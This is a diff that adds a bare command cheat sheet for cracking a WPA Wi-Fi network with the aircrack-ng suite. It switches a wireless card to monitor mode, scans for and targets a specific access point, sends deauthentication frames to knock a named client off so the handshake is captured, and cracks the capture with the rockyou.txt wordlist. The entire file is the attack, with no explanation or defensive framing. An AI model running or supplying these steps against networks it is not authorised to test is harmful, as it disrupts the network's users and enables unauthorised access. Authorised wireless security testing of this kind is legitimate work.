@@ -1,0 +1,23 @@
+sudo ifconfig wlan0 down
+
+sudo airmon-ng check kill
+
+sudo iwconfig wlan0 mode monitor
+
+sudo ifconfig wlan0 up
+
+
+sudo airodump-ng wlan0
+
+sudo airodump-ng --bssid 00:22:6B:80:08:9D --channel 6 wlan0
+
+
+
+
+sudo aireplay-ng --deauth 5 -a 00:22:6B:80:08:9D -c B8:94:E7:11:AE:05 wlan0   ----- handshake
+
+
+sudo airodump-ng --bssid 00:22:6B:80:08:9D --channel 6 wlan0 -w Abhijeet
+
+
+sudo aircrack-ng Abhijeet-01.cap -w rockyou.txt
